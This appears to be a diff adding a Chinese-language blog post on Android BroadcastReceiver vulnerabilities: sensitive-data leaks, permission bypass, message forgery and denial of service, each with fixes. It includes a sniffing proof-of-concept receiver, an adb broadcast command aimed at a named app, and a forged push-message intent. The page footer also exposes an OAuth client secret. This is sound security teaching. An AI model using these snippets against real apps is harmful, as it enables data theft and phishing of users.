@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="心中有光の孩子">
+    <meta name="keyword"  content="tea9">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        android Broadcast Receiver漏洞挖掘 - tea9的博客 | tea9&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 努力活着 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/avatar.png" />
+        </div>
+        <div class="name">
+            <i>tea9</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Broadcast-Receiver安全场景和危害"><span class="toc-text">Broadcast Receiver安全场景和危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Broadcast-Receiver漏洞分类"><span class="toc-text">Broadcast Receiver漏洞分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#敏感信息泄漏漏洞"><span class="toc-text">敏感信息泄漏漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#敏感信息泄露漏洞：修复"><span class="toc-text">敏感信息泄露漏洞：修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限绕过漏洞"><span class="toc-text">权限绕过漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限绕过漏洞：修复"><span class="toc-text">权限绕过漏洞：修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#消息伪造"><span class="toc-text">消息伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#消息伪造-防护"><span class="toc-text">消息伪造 防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拒绝服务"><span class="toc-text">拒绝服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拒绝服务-防护"><span class="toc-text">拒绝服务 防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Broadcast安全防护"><span class="toc-text">Broadcast安全防护</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> 努力活着 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        android Broadcast Receiver漏洞挖掘
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-03-07 00:00:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#android安全" title="android安全">android安全</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="Broadcast-Receiver安全场景和危害"><a href="#Broadcast-Receiver安全场景和危害" class="headerlink" title="Broadcast Receiver安全场景和危害"></a>Broadcast Receiver安全场景和危害</h2><p>BroadcastReceiver是Android的四大组件之一，这个组件涉及两个概念：广播发送者和广播接受者。<br>这里的广播实际上指的就是intent。<br>当发送一个广播时，系统会将发送的广播(intent)与系统中所有注册的符合条件的接收者的IntentFilter进行匹配，若匹配成功，则执行相应接收者的onReceive函数。<br>发送广播时如果处理不当，恶意应用便可以嗅探、拦截广播，致使敏感数据泄露等；如果接收广播时处理不当，便可导致拒绝服务攻击、伪造消息、越权操作等。  </p>
+<h2 id="Broadcast-Receiver漏洞分类"><a href="#Broadcast-Receiver漏洞分类" class="headerlink" title="Broadcast Receiver漏洞分类"></a>Broadcast Receiver漏洞分类</h2><ul>
+<li>敏感信息泄露</li>
+<li>权限绕过</li>
+<li>消息伪造</li>
+<li>拒绝服务</li>
+</ul>
+<h2 id="敏感信息泄漏漏洞"><a href="#敏感信息泄漏漏洞" class="headerlink" title="敏感信息泄漏漏洞"></a>敏感信息泄漏漏洞</h2><p>发送的intent没有明确指定接收者，而是简单的通过action进行匹配。恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播里存在敏感数据，就被恶意应用窃取了。  </p>
+<p>隐式意图发送敏感信息：  </p>
+<pre><code>private void d() {
+    Intent v1 = new Intent();
+    v1.setAction(&quot;com.sample.action.server_running&quot;);
+    v1.putExtra(&quot;local_ip&quot;,v0.h);
+    v1.putExtra(&quot;port&quot;,v0.i);
+    v1.putExtra(&quot;code&quot;,v0.g);
+    v1.putExtra(&quot;connected&quot;,v0.s);
+    v1.putExtra(&quot;pwd_predefined&quot;,v0.r);
+    if(!TextUtils.isEmpty(v0.t)){
+        v1.putExtra(&quot;connected_usr&quot;,v0.t);
+    }
+    sendBroadcast(v1);
+}
+</code></pre><p>POC:  </p>
+<pre><code>public void onReceive(Context context,Intent intent){
+    String s = null;
+    if(intent.getACtion().equals(&quot;com.sample.action.server_running&quot;)){
+        String pwd=intent.getStringExtra(&quot;connected&quot;);
+        s=&quot;Airdroid =&gt; [&quot;+pwd+&quot;]/&quot;+intent.getExtras();
+    }
+    Toast.makeTest(context,String.format(&quot;%sReceived&quot;,s),Toast.LENGTH_SHORT).show();
+}
+</code></pre><h2 id="敏感信息泄露漏洞：修复"><a href="#敏感信息泄露漏洞：修复" class="headerlink" title="敏感信息泄露漏洞：修复"></a>敏感信息泄露漏洞：修复</h2><p>修复后代码，使用LocalBroadcastManager.sendBroadcast()发出的广播只能被app自身广播接收器接收。  </p>
+<pre><code>Intent intent = new Intent(&quot;my-sensitive-event&quot;);
+intent.putExtra(&quot;event&quot;,&quot;this is a test event&quot;);
+LocalBroadcastManager.getInstance(this).sendBroadcast(intent);
+</code></pre><h2 id="权限绕过漏洞"><a href="#权限绕过漏洞" class="headerlink" title="权限绕过漏洞"></a>权限绕过漏洞</h2><p>可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过<receiver>标签静态注册。另外一种是通过Context.registerReceiver()动态注册,指定相应的intentFilter参数。然而动态注册的广播默认是导出的。如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等。  </receiver></p>
+<p>程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的。  </p>
+<p>code：  </p>
+<pre><code>android.intent.action.PACKAGE_FULLY_REMOVED
+</code></pre><p>漏洞证明：  </p>
+<pre><code>简单测试方法用adb shell 发送广播
+</code></pre><p>code区域：  </p>
+<pre><code>am broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d package:com.wumii.android.mimi
+</code></pre><h2 id="权限绕过漏洞：修复"><a href="#权限绕过漏洞：修复" class="headerlink" title="权限绕过漏洞：修复"></a>权限绕过漏洞：修复</h2><p>推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势。  </p>
+<p>1.不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。<br>2.不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。<br>3.它比系统的全局广播更高效。  </p>
+<h2 id="消息伪造"><a href="#消息伪造" class="headerlink" title="消息伪造"></a>消息伪造</h2><pre><code>暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输的，被调用的Receiver接收有可能产生安全隐患。  
+
+Intent i= new Intent();
+i.setAction(&quot;com.baidu.android.oushservice.action.MESSAGE&quot;);
+Bundle b = new Bundle();
+JSONObject jsobject = new JSONObject();
+JSONObject custom_content_js = new JSONObject();
+jsobject.put(&quot;title&quot;,&quot;百度云盘【漏洞你中奖了!】&quot;);
+
+jsobject.put(&quot;descrption&quot;,&quot;&quot;);
+
+//jsobject.put(&quot;url&quot;,&quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);
+JSONObject customcontent_js = new JSONObject();
+customcontent_js.put(&quot;type&quot;,&quot;1&quot;);
+customcontent_js.put(&quot;msg_type&quot;,&quot;resources_push&quot;);
+</code></pre><h2 id="消息伪造-防护"><a href="#消息伪造-防护" class="headerlink" title="消息伪造 防护"></a>消息伪造 防护</h2><pre><code>设置为签名验证
+android:protectionLevel=&quot;signature&quot;
+
+&lt;receiver android:name=&quot;com.umeng.message.UmengMessageBootReceiver&quot; android:protectionLevel=&quot;signature&quot;&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;
+</code></pre><h2 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h2><p>如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。  </p>
+<p>拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。  </p>
+<h2 id="拒绝服务-防护"><a href="#拒绝服务-防护" class="headerlink" title="拒绝服务 防护"></a>拒绝服务 防护</h2><ul>
+<li>空指针异常</li>
+<li>类型转换异常</li>
+<li>数组越界访问异常</li>
+<li>类未定义异常</li>
+<li><p>其他异常</p>
+<p>  //Serializable：<br>  Intent i = this.getIntent();<br>  if(i.getAction().equals(“serializable_action”)){</p>
+<pre><code>i.getSerializableExtra(&quot;serializable_key&quot;);//未做异常判断
+</code></pre><p>  }<br>  //Parcelable:<br>  this.b=(RouterConfig)this.getIntent().getParcelableExtra(“filed_router_config”);//引发转型异常崩溃</p>
+</li>
+</ul>
+<p>谨慎处理接收的intent以及其携带的信息。<br>对接收到的任何数据做try catch处理，以及对不符合预期的数据做异常处理。  </p>
+<h2 id="Broadcast安全防护"><a href="#Broadcast安全防护" class="headerlink" title="Broadcast安全防护"></a>Broadcast安全防护</h2><ul>
+<li>私有广播接收器设置exported=’false’,并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</li>
+<li>对接收来的广播进行验证。</li>
+<li>内部app之间的广播使用protectionLevel=’signature’ 验证其是否真是内部app。</li>
+<li>返回结果时需注意接收app是否会泄露信息。 </li>
+<li>发送的广播包含敏感信息时需指定广播接收器，使用显示意图或者setPackage(String packageName)。</li>
+<li>使用LocalBroadcastManager。</li>
+</ul>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/shaomiaosun">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/tea9">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://www.10000h.top">10000H</a></span>
+        <span>/</span>
+        
+        <span><a href="https://niexiaotao.com">Xiaotao&#39;s Page</a></span>
+        <span>/</span>
+        
+        <span><a href="#">It helps SEO</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script src="/js/gitment.js"></script>
+<script>
+    var gitment = new Gitment({
+        id: 'android Broadcast Receiver漏洞挖掘',
+        owner: 'tea9',
+        repo: 'tea9.github.io',
+        oauth: {
+            client_id: 'dd67fb84ddbc6cf9c112',
+            client_secret: 'be4e88389be3e45fbafbd7592148fa47feacaacf',
+        },
+    })
+    gitment.render('comment-container')
+</script>
+
+
+
+
+</html>
